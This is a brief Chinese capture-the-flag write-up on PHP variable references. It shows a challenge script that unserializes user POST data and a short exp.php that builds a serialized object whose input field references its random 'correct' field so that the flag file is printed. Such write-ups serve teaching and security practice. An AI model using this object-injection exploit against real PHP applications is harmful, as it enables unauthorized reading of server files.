# 考察知识点：

## 1. php变量引用

大体意思就是通过&符号：

```javascript
$a=&$b;
将a变量和b变量指向同一个地址，是两个变量的值相等
```



官方文档：

1.引用是什么：http://www.php.net/manual/zh/language.references.whatare.php

2.引用做什么：http://www.php.net/manual/zh/language.references.whatdo.php

3.引用传递：http://www.php.net/manual/zh/language.references.pass.php

4.引用返回：http://www.php.net/manual/zh/language.references.return.php





```javascript
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```



exp.php

```javascript
<?php
class BUU
{
    public $correct = "";
    public $input ="";
}
$buu =new BUU();
$buu->input=&$buu->correct;

echo serialize($buu);

```



